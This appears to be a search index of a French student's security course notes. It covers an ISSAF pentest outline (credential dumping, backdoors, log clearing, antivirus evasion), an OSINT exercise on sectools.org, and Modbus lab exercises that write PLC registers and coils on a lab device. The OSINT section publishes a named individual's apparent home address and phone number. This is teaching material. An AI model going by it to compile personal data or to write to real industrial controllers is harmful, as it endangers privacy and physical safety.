Management Information Base (MIB) Service fingerprinting","title":"Network mapping"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#vulnerability-identification","text":"Identify vulnerable services using service banners Perform vulnerability scan to search for known vulnerabilities. Information regarding known vulnerabilities can be obtained from the vendors\u2019 security announcements, or from public databases such as SecurityFocus, CVE or CERT advisories. Perform false positive and false negative verification (e.g. by correlating vulnerabilities with each other and with previously acquired information) Enumerate discovered vulnerabilities Estimate probable impact (classify vulnerabilities found) Identify attack paths and scenarios for exploitation","title":"Vulnerability identification"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#penetration","text":"Find proof of concept code/tool Develop tools/scripts Test proof of concept code/tool Use proof of concept code against target Verify or disprove the existence of vulnerabilities","title":"Penetration"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#gaining-access-privilege-escalation","text":"","title":"Gaining access &amp; Privilege escalation"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#gaining-access","text":"","title":"Gaining access"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#gain-least-privilege","text":"Discovery of username/password combinations (e.g. dictionary attacks, brute force attacks) Discovery of blank password or default passwords in system accounts Exploit vendor default settings (such as network configuration parameters, passwords and others) Discovery of public services that allow for certain operations within the system (e.g. writing/creating/reading files)","title":"Gain Least Privilege"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#enumerating-further","text":"Obtain encrypted passwords for offline cracking (for example by dumping the SAM on Windows systems, or copying /etc/passwd and /etc/shadow from a Linux system) Obtain password (plaintext or encrypted) by using sniffing or other techniques Sniff traffic and analyze it Gather cookies and use them to exploit sessions and for password attacks E-mail address gathering Identifying routes and networks Mapping internal networks Perform steps 1 to 6 again with this system as starting point","title":"Enumerating Further"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#compromise-remote-users-sites","text":"Try to get remote access to other networks, sites => Follow again all steps","title":"Compromise remote users / sites"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#maintaining-access","text":"","title":"Maintaining access"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#covert-channels","text":"Identify Covert Channel Which Can Be Used Select the Best Available Tool for the Covert Channel Methodology - Setup the Covert Channel in the Target Network Test the Covertness of Channel Using Common Detection Technique","title":"Covert channels"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#backdoors","text":"Setting up backdoors","title":"Backdoors"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#root-kits","text":"Setting up Root-kits","title":"Root-Kits"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#covering-tracks","text":"","title":"Covering tracks"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#hide-files","text":"Hide files","title":"Hide files"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#clear-logs","text":"check history Edit log files","title":"Clear logs"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#defeat-integrity-checking","text":"Look for integrity checking and try to defeat it (file whiti signature, misconfiguration, ...)","title":"Defeat integrity checking"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#defeat-anti-virus","text":"Disable the AV services Block the central management port","title":"Defeat anti-virus"},{"location":"methodologie_pentest/ISSAF/template_ISSAF/#impl","text":"IDS FIREWALL ANTIVIRUS p483 linux p607-699 web","title":"Impl"},{"location":"methodologie_pentest/exercices/sectools.org/","text":"Effectuer une recherche passive d\u2019informations concernant le domaine sectools.org, en vous basant sur ce cours, ainsi que le document ISSAF. 1) O\u00f9 est situ\u00e9 le site web de l\u2019entreprise whois sectools.org Domain Name: SECTOOLS.ORG Registry Domain ID: D104142653-LROR Registrar WHOIS Server: whois.fabulous.com Registrar URL: http://www.fabulous.com Updated Date: 2020-01-14T05:39:23Z Creation Date: 2004-03-23T23:38:24Z Registry Expiry Date: 2028-03-23T23:38:24Z Registrar Registration Expiration Date: Registrar: Sea Wasp, LLC Registrar IANA ID: 411 Registrar Abuse Contact Email: support@fabulous.com Registrar Abuse Contact Phone: +61.282133006 Reseller: Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited Registrant Organization: Insecure.Com LLC Registrant State/Province: WA Registrant Country: US Name Server: NS1.LINODE.COM Name Server: NS2.LINODE.COM Name Server: NS3.LINODE.COM Name Server: NS4.LINODE.COM Name Server: NS5.LINODE.COM DNSSEC: unsigned Registrant Country: US => maybe RIR: ARIN 2) Que disent les moteurs de recherche de cette cible En utilisant le moteur de rehcerche SPYSE : spyse.com Apache 2.4.6 Centos 49 CVE d\u00e9couvertes (illisible => version payante) mx : mail.titan.net Certificat let's encrypt, RSA SHA-256 2048 bits Plusieurs noms de domaines dont : https://svn.nmap.org/ anciennes version des produits d'insecure. 3) Quels sont les employ\u00e9s, ont-ils des sites web perso Nmap \u00e9tant une association open source, je ne pense pas qu'il y est d'employ\u00e9. N\u00e9anmoins, theHarvester me renvois des noms. Par eventualit\u00e9 je les listes, m\u00eame si je doute qu'il y ai le moindre rapport avec sectools. sudo theHarvester -d sectools -b linkedin Henri Hurmerinta - Application Specialist - Visma Luigi Gentile - Chief Information Security Officer - Reply Mardian Gunawan - Security Consultant - Consultant Maria Kahilampi - Entrepreneur - CoCo-Palvelut Ky Mika Kosunen - Web Developer - Legenda Pallav Raj Gurung - Manager - Morgan Stanley Pekka Vesanen - Salesmanager - Veho Group Oy Ab Ramanjaneya Devi Madem - Technical Leader - Cisco Samrend Hasan - Project Manager - Blueraft Yadu Mathur - Staff Software Engineer - Walmart Labs Henri Hurmerinta : https://community.visma.com/t5/media/gallerypage/user-id/265037/tab/all Luigi Gentile : Rien trouv\u00e9 Mardian Gunawan : Rien trouv\u00e9 Maria Kahilampi : Rien trouv\u00e9 Mika Kosunen : http://www.mikakosunen.com/ Pallav Raj Gurung : http://rajgurung.com/ https://github.com/rajgurung Pekka Vesanen : Rien trouv\u00e9 Ramanjaneya Devi Madem : Rien trouv\u00e9 Samrend Hasan : Rien trouv\u00e9 Yadu Mathur : Rien trouv\u00e9 4) Que pense les sites de reporting financier concernant ce domaine Pas compris 5) Quel est le taux de disponibilit\u00e9 du site ? Je n'ai pas trouv\u00e9 de moyen d'avoir l'uptime du site sectools.org, alors j'ai pris l'uptime de l'hebergeur. Uptime services linode : https://status.linode.com/ 6) Que renvoient les sites de supervision de domaines Pas compris 7) Que trouve t\u2019on concernant ce domaine sur les r\u00e9seaux p2p 8) Pr\u00e9sent sur les chat IRC Channel officiel IRC : #nmap sur freenode.net 9) Y a-t-il des recrutement en cours ? Non, rien sur les sites : - sectools.org - indeed.fr - linkedin.fr 10) Y a-t-il des posts sur les newsgroup ? Pas compris 11) Quelles informations donnent le registar ? Voir question 1 12) Y a-t-il pr\u00e9sence d\u2019un reverse DNS dig -x 45.33.49.119 ; <<>> DiG 9.16.2-Debian <<>> -x 45.33.49.119 ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25990 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;119.49.33.45.in-addr.arpa. IN PTR ;; ANSWER SECTION: 119.49.33.45.in-addr.arpa. 86388 IN PTR ack.nmap.org. ;; Query time: 4 msec ;; SERVER: 192.168.1.1#53(192.168.1.1) ;; WHEN: dim. oct. 04 16:29:28 CEST 2020 ;; MSG SIZE rcvd: 80 ack.nmap.org. 13) Que disent les DNS dnsenum --enum sectools.org Trying Zone Transfers and getting Bind Versions: _________________________________________________ Trying Zone Transfer for sectools.org on ns4.linode.com ... AXFR record query failed: NOTIMP Trying Zone Transfer for sectools.org on ns3.linode.com ... AXFR record query failed: NOTIMP Trying Zone Transfer for sectools.org on ns2.linode.com ... AXFR record query failed: NOTIMP Trying Zone Transfer for sectools.org on ns5.linode.com ... AXFR record query failed: NOTIMP Trying Zone Transfer for sectools.org on ns1.linode.com ... AXFR record query failed: NOTIMP 5 serveurs DNS heberg\u00e9s chez LINODE.com, transfert de zone impossible. 14) Ce domaine est il pr\u00e9sent dans les bases de donn\u00e9es de spam ? Sur le site : dnsbl.info 162.159.25.129 Blacklisted : dynip.rothen.com 162.159.27.72 Blacklisted : dynip.rothen.com 162.159.24.39 Blacklisted : dynip.rothen.com 162.159.26.99 Blacklisted : dynip.rothen.com 162.159.24.25 Blacklisted : dynip.rothen.com mail : 64.13.134.2 Blacklisted : dynip.rothen.com Numero personnel gordon fyodor lyon Vaskovich https://www.whitepages.com/name/Fyodor-Vaskovich/Sunnyvale-CA/1c6shdu1 Adresse : 370 Altair Way # 113 Sunnyvale CA T\u00e9l\u00e9phone : (650) 989-4206 tips shodan.io efficace pour trouver des devices maltego tr\u00e8s bien pour commencer \u00e0 faire de l'ing\u00e9ni\u00e9rie sociale. the harvester, il faut config avec des cl\u00e9s api des moteur de recherches metagoofil, trouver des documents sur un domaine : Metagoofil \u2013d nmap.org \u2013t pdf","title":"Sectools.org"},{"location":"methodologie_pentest/exercices/sectools.org/#numero-personnel-gordon-fyodor-lyon-vaskovich","text":"https://www.whitepages.com/name/Fyodor-Vaskovich/Sunnyvale-CA/1c6shdu1 Adresse : 370 Altair Way # 113 Sunnyvale CA T\u00e9l\u00e9phone : (650) 989-4206","title":"Numero personnel gordon fyodor lyon Vaskovich"},{"location":"methodologie_pentest/exercices/sectools.org/#tips","text":"shodan.io efficace pour trouver des devices maltego tr\u00e8s bien pour commencer \u00e0 faire de l'ing\u00e9ni\u00e9rie sociale. the harvester, il faut config avec des cl\u00e9s api des moteur de recherches metagoofil, trouver des documents sur un domaine : Metagoofil \u2013d nmap.org \u2013t pdf","title":"tips"},{"location":"reseaux_industriels/grafcet/","text":"Graphset exemple Transition : on passe d'une \u00e9tape \u00e0 la suivante en franchissant une transition. Une transition est pr\u00e9sente quand c'est une n\u00e9cessit\u00e9. Etape : Toujours un verbe \u00e0 l'infinitif OU ET","title":"Graphset"},{"location":"reseaux_industriels/grafcet/#graphset","text":"","title":"Graphset"},{"location":"reseaux_industriels/grafcet/#exemple","text":"Transition : on passe d'une \u00e9tape \u00e0 la suivante en franchissant une transition. Une transition est pr\u00e9sente quand c'est une n\u00e9cessit\u00e9. Etape : Toujours un verbe \u00e0 l'infinitif","title":"exemple"},{"location":"reseaux_industriels/grafcet/#ou","text":"","title":"OU"},{"location":"reseaux_industriels/grafcet/#et","text":"","title":"ET"},{"location":"reseaux_industriels/reseaux_industriel/","text":"R\u00e9seaux industriels Presentation Voici une usine \u00e0 Th\u00e9, tous les composants sont contr\u00f4l\u00e9s par un controleur Le PLC (boitier de commande), g\u00e8re les capteurs (actionneurs) et les moteurs. Par la suite on a connect\u00e9 c'est boitier de commande \u00e0 un poste de supervision (SCADA) pour g\u00e9rer plusieurs syst\u00e8mes industriels \u00e0 distances. Un syst\u00e8me de contr\u00f4le SCADA permet de recevoir des donn\u00e9es depuis les boitier de commande, mais aussi les contr\u00f4ler ! En piratant le PC de supervision, on peut contr\u00f4ler l'ensemble des r\u00e9seaux industriels. Tous ces composants ont des firmware, tr\u00e8s peu mis \u00e0 jour. => STUXNET Les Bus Machine outil (pilotage)(machine autonome) Bus capteur : ASI, Seriplex Bus actionneur : interbus Bus de terrain (device bus): Modbus, interbus-S, profibus, device net Machine (pilotage et/ou process) => machine discute avec PLC ou SCADA Bus fieldbus (bus locaux), Flipway, profibus, FMS pilotage des processus (SCADA) Ethernet, MMS Bus entre cartes electroniques et une machine Bus I2C : interconnection des cartes electroniques entre elles, ou entre composants sur une m\u00eame carte \u00e9lectronique. Bus CAN : relier 2 cartes electronique entre elles (< 1km) Bus D2B : < 100m tr\u00e8s utile (enciennement) en domotique. Contraintes industrielles Determinisme : c'est quand le comportement (notion de temps) des sorties est totalement pr\u00e9visible en fonction des valeurs des entr\u00e9es. Dans les usines il est important de r\u00e9action des \u00e9quipements. Ex : Le bouton d'arr\u00eat d'urgence ne peut \u00eatre g\u00e9rer par ethernet (best effort), il faut que quand le bouton soit pr\u00e9sser, tout s'arr\u00eate le plus rapidement possible et de fa\u00e7on syst\u00e9matique ! Pr\u00e9visibilit\u00e9 : On sait de source s\u00fbr comment mon syst\u00e8me se comporte en fonction des entr\u00e9es/sorties. Urgence : priorise le traitement des urgences en fonction de leur gravit\u00e9s. Contraintes environnementales : corrosivit\u00e9, explosivit\u00e9, etc Token ring : Chacun a la parole pendant un temps, si un tombe en panne tout se casse la gueulle. D\u00e9bit faible. Presentation des Bus Modbus Cr\u00e9\u00e9 en 1979, bus et protocole de communication sur le mod\u00e8le ma\u00eetre/esclave. RS232 (1 ma\u00eetre (actif ou passif), 115 kb/s, 15 m\u00e8tres) RS422 (plus utilis\u00e9) RS485 (r\u00e9trocompatible RS232) Bas\u00e9 sur un mod\u00e8le requ\u00eate / r\u00e9ponse structur\u00e9 en PDU (Protocol Data Unit) identique en serie ou ethernet. et en ADU (Application Data Unit) Adresse escalve null => Broadcast MBAP : - Transaction ID : (2 octets, encod\u00e9 en ASCII), d\u00e9fini par le client (esclave), r\u00e9utilis\u00e9 par le serveur pour parler au client. - Protocol ID : (2 octets), toujours \u00e0 0000. - Length : (2 octets), longueur du message qui va suivre (octets) - Unit ID : (2 octets), num\u00e9ro (adresse) de l'esclave","title":"R\u00e9seaux industriels"},{"location":"reseaux_industriels/reseaux_industriel/#reseaux-industriels","text":"","title":"R\u00e9seaux industriels"},{"location":"reseaux_industriels/reseaux_industriel/#presentation","text":"Voici une usine \u00e0 Th\u00e9, tous les composants sont contr\u00f4l\u00e9s par un controleur Le PLC (boitier de commande), g\u00e8re les capteurs (actionneurs) et les moteurs. Par la suite on a connect\u00e9 c'est boitier de commande \u00e0 un poste de supervision (SCADA) pour g\u00e9rer plusieurs syst\u00e8mes industriels \u00e0 distances. Un syst\u00e8me de contr\u00f4le SCADA permet de recevoir des donn\u00e9es depuis les boitier de commande, mais aussi les contr\u00f4ler ! En piratant le PC de supervision, on peut contr\u00f4ler l'ensemble des r\u00e9seaux industriels. Tous ces composants ont des firmware, tr\u00e8s peu mis \u00e0 jour. => STUXNET","title":"Presentation"},{"location":"reseaux_industriels/reseaux_industriel/#les-bus","text":"Machine outil (pilotage)(machine autonome) Bus capteur : ASI, Seriplex Bus actionneur : interbus Bus de terrain (device bus): Modbus, interbus-S, profibus, device net Machine (pilotage et/ou process) => machine discute avec PLC ou SCADA Bus fieldbus (bus locaux), Flipway, profibus, FMS pilotage des processus (SCADA) Ethernet, MMS Bus entre cartes electroniques et une machine Bus I2C : interconnection des cartes electroniques entre elles, ou entre composants sur une m\u00eame carte \u00e9lectronique. Bus CAN : relier 2 cartes electronique entre elles (< 1km) Bus D2B : < 100m tr\u00e8s utile (enciennement) en domotique.","title":"Les Bus"},{"location":"reseaux_industriels/reseaux_industriel/#contraintes-industrielles","text":"Determinisme : c'est quand le comportement (notion de temps) des sorties est totalement pr\u00e9visible en fonction des valeurs des entr\u00e9es. Dans les usines il est important de r\u00e9action des \u00e9quipements. Ex : Le bouton d'arr\u00eat d'urgence ne peut \u00eatre g\u00e9rer par ethernet (best effort), il faut que quand le bouton soit pr\u00e9sser, tout s'arr\u00eate le plus rapidement possible et de fa\u00e7on syst\u00e9matique ! Pr\u00e9visibilit\u00e9 : On sait de source s\u00fbr comment mon syst\u00e8me se comporte en fonction des entr\u00e9es/sorties. Urgence : priorise le traitement des urgences en fonction de leur gravit\u00e9s. Contraintes environnementales : corrosivit\u00e9, explosivit\u00e9, etc Token ring : Chacun a la parole pendant un temps, si un tombe en panne tout se casse la gueulle. D\u00e9bit faible.","title":"Contraintes industrielles"},{"location":"reseaux_industriels/reseaux_industriel/#presentation-des-bus","text":"","title":"Presentation des Bus"},{"location":"reseaux_industriels/reseaux_industriel/#modbus","text":"Cr\u00e9\u00e9 en 1979, bus et protocole de communication sur le mod\u00e8le ma\u00eetre/esclave. RS232 (1 ma\u00eetre (actif ou passif), 115 kb/s, 15 m\u00e8tres) RS422 (plus utilis\u00e9) RS485 (r\u00e9trocompatible RS232) Bas\u00e9 sur un mod\u00e8le requ\u00eate / r\u00e9ponse structur\u00e9 en PDU (Protocol Data Unit) identique en serie ou ethernet. et en ADU (Application Data Unit) Adresse escalve null => Broadcast MBAP : - Transaction ID : (2 octets, encod\u00e9 en ASCII), d\u00e9fini par le client (esclave), r\u00e9utilis\u00e9 par le serveur pour parler au client. - Protocol ID : (2 octets), toujours \u00e0 0000. - Length : (2 octets), longueur du message qui va suivre (octets) - Unit ID : (2 octets), num\u00e9ro (adresse) de l'esclave","title":"Modbus"},{"location":"reseaux_industriels/exercice/grafcet/grafcet_instructions/","text":"Si delta >= 2\u00b0 => 25% puissance Si delta >= 5\u00b0 => 50% puissance Si delta >= 10 => 100% puissance Points de mesure t\u00b0 effective : 10 minutes Un imeuble avec en 4 etages. Chaque \u00e9tage \u00e0 sa sonde de temp\u00e9rature. macro pour un \u00e9tage","title":"Grafcet instructions"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/","text":"Exercices modbus Julien Faou Installation modbus sudo pip3 install pyModbus Exercice 1 - Compromission avec modbus-cli sudo modbus read -h Usage: modbus read [OPTIONS] HOST ADDRESS COUNT Parameters: HOST IP address or hostname for the Modbus device ADDRESS Start address (eg %M100, %MW100, 101, 400101) COUNT number of data to read Options: -w, --word use unsigned 16 bit integers -i, --int use signed 16 bit integers -d, --dword use unsigned 32 bit integers -f, --float use signed 32 bit floating point values --modicon use Modicon addressing (eg. coil: 101, word: 400001) --schneider use Schneider addressing (eg. coil: %M100, word: %MW0, float: %MF0, dword: %MD0) -s, --slave ID use slave id ID (default: 1) -p, --port PORT use TCP port (default: 502) -o, --output FILE write results to file FILE -D, --debug show debug messages -T, --timeout TIMEOUT Specify the timeout in seconds when talking to the slave -C, --connect-timeout TIMEOUT Specify the timeout in seconds when connecting to TCP socket -h, --help print help A l\u2019aide de la commande modbus read, lisez les 5 premiers registres de type bit sudo modbus 192.168.43.161 1 5 1 1 2 1 3 1 4 1 5 1 A l\u2019aide de la commande modbus read, isez les 5 premiers registres entiers sudo modbus read 192.168.43.161 400001 5 400001 17 400002 17 400003 17 400004 17 400005 17 A l\u2019aide de write, modifier un entier parmi les 5 premiers entiers sudo modbus write -h Usage: modbus write [OPTIONS] HOST ADDRESS VALUES ... Parameters: HOST IP address or hostname for the Modbus device ADDRESS Start address (eg %M100, %MW100, 101, 400101) VALUES ... values to write, nonzero counts as true for discrete values Options: -w, --word use unsigned 16 bit integers -i, --int use signed 16 bit integers -d, --dword use unsigned 32 bit integers -f, --float use signed 32 bit floating point values --modicon use Modicon addressing (eg. coil: 101, word: 400001) --schneider use Schneider addressing (eg. coil: %M100, word: %MW0, float: %MF0, dword: %MD0) -s, --slave ID use slave id ID (default: 1) -p, --port PORT use TCP port (default: 502) -D, --debug show debug messages -T, --timeout TIMEOUT Specify the timeout in seconds when talking to the slave -C, --connect-timeout TIMEOUT Specify the timeout in seconds when connecting to TCP socket -h, --help print help sudo modbus write -i 192.168.43.161 400002 6 sudo modbus read -i 192.168.43.161 400002 1 400002 6 A l\u2019aide de write, modifier un bool\u00e9en parmi les 5 premiers bool\u00e9ens modifiables sudo modbus write 192.168.43.161 3 0 sudo modbus read 192.168.43.161 3 1 3 0 Exercice 2 - Scan avec Nmap Executer un nmap avec un script nse d\u00e9di\u00e9 \u00e0 l\u2019\u00e9num\u00e9ration pour modbus nmap --script-help \"*modbus*\" Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 14:24 CEST modbus-discover Categories: discovery intrusive https://nmap.org/nsedoc/scripts/modbus-discover.html Enumerates SCADA Modbus slave ids (sids) and collects their device information. Modbus is one of the popular SCADA protocols. This script does Modbus device information disclosure. It tries to find legal sids (slave ids) of Modbus devices and to get additional information about the vendor and firmware. This script is improvement of modscan python utility written by Mark Bristow. Information about MODBUS protocol and security issues: * MODBUS application protocol specification: http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf * Defcon 16 Modscan presentation: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-bristow.pdf * Modscan utility is hosted at google code: http://code.google.com/p/modscan/ nmap -p502 --script modbus-discover.nse 192.168.43.161 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 09:21 CEST Nmap scan report for 192.168.43.161 Host is up (0.0018s latency). PORT STATE SERVICE 502/tcp open modbus | modbus-discover: | sid 0x1: | Slave ID data: PyModbus Inc.-PM-1.0\\xFF |_ Device identification: PyModbus Inc. PM 1.0 Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds Exercice 3 - Recherche d'exploit Trouver au moins un exploit existant dans exploit-db.com concernant un serveur modbus Exercice 4 - Avec Scapy ip=IP(src='192.168.118.128',dst='192.168.43.161') tcp=TCP(sport=6666,dport=502,flags='S') pkt=ip/tcp pkt.show() ###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= tcp chksum= None src= 192.189.118.128 dst= 192.168.43.161 \\options\\ ###[ TCP ]### sport= 6666 dport= 502 seq= 0 ack= 0 dataofs= None reserved= 0 flags= S window= 8192 chksum= None urgptr= 0 options= [] send(pkt) answ=sr1(pkt) answ=sr1(pkt) Begin emission: .Finished sending 1 packets. * Received 2 packets, got 1 answers, remaining 0 packets answ.show() ###[ IP ]### version= 4 ihl= 5 tos= 0x0 len= 44 id= 65409 flags= frag= 0 ttl= 128 proto= tcp chksum= 0x17d8 src= 192.168.43.161 dst= 192.168.118.128 \\options\\ ###[ TCP ]### sport= 502 dport= 6666 seq= 1364939808 ack= 1 dataofs= 6 reserved= 0 flags= SA window= 64240 chksum= 0xb836 urgptr= 0 options= [('MSS', 1460)] ###[ Padding ]### load= '\\x00\\x00' Rechercher un framework (lmot cl\u00e9 smod?) pour scapy permettant de crafter des requetes vers des serveurs modbus Dans le script \"asyncmodbus.py\" utilis\u00e9 pour cr\u00e9er le serveur, la library pymodbus est utilis\u00e9. Voici la documentation : https://pymodbus.readthedocs.io/en/latest/index.html Read and write boolean from pymodbus.client.sync import ModbusTcpClient client = ModbusTcpClient('192.168.43.161') client.write_coil(1, False) result = client.read_coils(1,1) print(result.bits[0]) client.close() False from pymodbus.client.sync import ModbusTcpClient client = ModbusTcpClient('192.168.43.161') client.write_coil(1, True) result = client.read_coils(1,1) print(result.bits[0]) client.close() True","title":"Exercices modbus"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#exercices-modbus","text":"","title":"Exercices modbus"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#julien-faou","text":"","title":"Julien Faou"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#installation-modbus","text":"sudo pip3 install pyModbus","title":"Installation modbus"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#exercice-1-compromission-avec-modbus-cli","text":"sudo modbus read -h Usage: modbus read [OPTIONS] HOST ADDRESS COUNT Parameters: HOST IP address or hostname for the Modbus device ADDRESS Start address (eg %M100, %MW100, 101, 400101) COUNT number of data to read Options: -w, --word use unsigned 16 bit integers -i, --int use signed 16 bit integers -d, --dword use unsigned 32 bit integers -f, --float use signed 32 bit floating point values --modicon use Modicon addressing (eg. coil: 101, word: 400001) --schneider use Schneider addressing (eg. coil: %M100, word: %MW0, float: %MF0, dword: %MD0) -s, --slave ID use slave id ID (default: 1) -p, --port PORT use TCP port (default: 502) -o, --output FILE write results to file FILE -D, --debug show debug messages -T, --timeout TIMEOUT Specify the timeout in seconds when talking to the slave -C, --connect-timeout TIMEOUT Specify the timeout in seconds when connecting to TCP socket -h, --help print help A l\u2019aide de la commande modbus read, lisez les 5 premiers registres de type bit sudo modbus 192.168.43.161 1 5 1 1 2 1 3 1 4 1 5 1 A l\u2019aide de la commande modbus read, isez les 5 premiers registres entiers sudo modbus read 192.168.43.161 400001 5 400001 17 400002 17 400003 17 400004 17 400005 17 A l\u2019aide de write, modifier un entier parmi les 5 premiers entiers sudo modbus write -h Usage: modbus write [OPTIONS] HOST ADDRESS VALUES ... Parameters: HOST IP address or hostname for the Modbus device ADDRESS Start address (eg %M100, %MW100, 101, 400101) VALUES ... values to write, nonzero counts as true for discrete values Options: -w, --word use unsigned 16 bit integers -i, --int use signed 16 bit integers -d, --dword use unsigned 32 bit integers -f, --float use signed 32 bit floating point values --modicon use Modicon addressing (eg. coil: 101, word: 400001) --schneider use Schneider addressing (eg. coil: %M100, word: %MW0, float: %MF0, dword: %MD0) -s, --slave ID use slave id ID (default: 1) -p, --port PORT use TCP port (default: 502) -D, --debug show debug messages -T, --timeout TIMEOUT Specify the timeout in seconds when talking to the slave -C, --connect-timeout TIMEOUT Specify the timeout in seconds when connecting to TCP socket -h, --help print help sudo modbus write -i 192.168.43.161 400002 6 sudo modbus read -i 192.168.43.161 400002 1 400002 6 A l\u2019aide de write, modifier un bool\u00e9en parmi les 5 premiers bool\u00e9ens modifiables sudo modbus write 192.168.43.161 3 0 sudo modbus read 192.168.43.161 3 1 3 0","title":"Exercice 1 - Compromission avec modbus-cli"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#exercice-2-scan-avec-nmap","text":"Executer un nmap avec un script nse d\u00e9di\u00e9 \u00e0 l\u2019\u00e9num\u00e9ration pour modbus nmap --script-help \"*modbus*\" Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 14:24 CEST modbus-discover Categories: discovery intrusive https://nmap.org/nsedoc/scripts/modbus-discover.html Enumerates SCADA Modbus slave ids (sids) and collects their device information. Modbus is one of the popular SCADA protocols. This script does Modbus device information disclosure. It tries to find legal sids (slave ids) of Modbus devices and to get additional information about the vendor and firmware. This script is improvement of modscan python utility written by Mark Bristow. Information about MODBUS protocol and security issues: * MODBUS application protocol specification: http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf * Defcon 16 Modscan presentation: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-bristow.pdf * Modscan utility is hosted at google code: http://code.google.com/p/modscan/ nmap -p502 --script modbus-discover.nse 192.168.43.161 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 09:21 CEST Nmap scan report for 192.168.43.161 Host is up (0.0018s latency). PORT STATE SERVICE 502/tcp open modbus | modbus-discover: | sid 0x1: | Slave ID data: PyModbus Inc.-PM-1.0\\xFF |_ Device identification: PyModbus Inc. PM 1.0 Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds","title":"Exercice 2 - Scan avec Nmap"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#exercice-3-recherche-dexploit","text":"Trouver au moins un exploit existant dans exploit-db.com concernant un serveur modbus","title":"Exercice 3 - Recherche d'exploit"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#exercice-4-avec-scapy","text":"ip=IP(src='192.168.118.128',dst='192.168.43.161') tcp=TCP(sport=6666,dport=502,flags='S') pkt=ip/tcp pkt.show() ###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= tcp chksum= None src= 192.189.118.128 dst= 192.168.43.161 \\options\\ ###[ TCP ]### sport= 6666 dport= 502 seq= 0 ack= 0 dataofs= None reserved= 0 flags= S window= 8192 chksum= None urgptr= 0 options= [] send(pkt) answ=sr1(pkt) answ=sr1(pkt) Begin emission: .Finished sending 1 packets. * Received 2 packets, got 1 answers, remaining 0 packets answ.show() ###[ IP ]### version= 4 ihl= 5 tos= 0x0 len= 44 id= 65409 flags= frag= 0 ttl= 128 proto= tcp chksum= 0x17d8 src= 192.168.43.161 dst= 192.168.118.128 \\options\\ ###[ TCP ]### sport= 502 dport= 6666 seq= 1364939808 ack= 1 dataofs= 6 reserved= 0 flags= SA window= 64240 chksum= 0xb836 urgptr= 0 options= [('MSS', 1460)] ###[ Padding ]### load= '\\x00\\x00' Rechercher un framework (lmot cl\u00e9 smod?) pour scapy permettant de crafter des requetes vers des serveurs modbus Dans le script \"asyncmodbus.py\" utilis\u00e9 pour cr\u00e9er le serveur, la library pymodbus est utilis\u00e9. Voici la documentation : https://pymodbus.readthedocs.io/en/latest/index.html","title":"Exercice 4 - Avec Scapy"},{"location":"reseaux_industriels/exercice/modbus/exercice_modbus/#read-and-write-boolean","text":"from pymodbus.client.sync import ModbusTcpClient client = ModbusTcpClient('192.168.43.161') client.write_coil(1, False) result = client.read_coils(1,1) print(result.bits[0]) client.close() False from pymodbus.client.sync import ModbusTcpClient client = ModbusTcpClient('192.168.43.161') client.write_coil(1, True) result = client.read_coils(1,1) print(result.bits[0]) client.close() True","title":"Read and write boolean"},{"location":"securit\u00e9_IOT/cours/","text":"Cloud computing Definition D\u00e9finition du NIST : Mod\u00e8le omnipr\u00e9sent Adapt\u00e9 aux besoins Disponible \u00e0 la demande Utilise des r\u00e9seaux Acc\u00e9der \u00e0 des moyens informatiques, partag\u00e9s, configurable Les moyens informatique peuvent \u00eatre r\u00e9serv\u00e9s et lib\u00e9r\u00e9s en fonction des besoins AVEC un effort minimal de configuration Facturation T\u00e9l\u00e9m\u00e9trie , le prix est calcul\u00e9 sur beaucoup d'aspect : Utilisation CPU Stockage etc Raison pour aller dans le cloud ? Economique Pour toutes les entreprises, le service info est un centre de co\u00fbt, pas de profit. Mais le cloud est piegeux, les co\u00fbts grimpent vite ! Mais alors au top niveau infra Securit\u00e9 Les informaticiens ne sont pas toujours amis avec la s\u00e9curit\u00e9, ma\u00eetrise pas toujours le concept, les outils, etc... Entre attaquer une infra d'un PME ou AWS/OVH/etc c'est pas pareil. Migrer dans le cloud 1) Recencer tous les processus de l'entreprise => BPL (graph simple et comprehensible par lambda) 2) Recencer tous les biens (assessments, les choses 